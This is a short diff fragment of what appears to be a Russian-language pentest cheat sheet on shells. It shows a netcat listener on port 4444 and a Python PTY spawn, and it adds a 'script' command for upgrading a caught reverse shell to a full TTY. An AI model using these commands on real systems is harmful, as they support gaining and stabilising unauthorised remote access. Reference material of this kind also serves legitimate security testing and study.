@@ -19,6 +19,10 @@ sudo nc -lvnp 4444
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
+```
+/usr/bin/script -qc /bin/bash /dev/null
+```
+
 Полиглотный шелл:
 
 ```
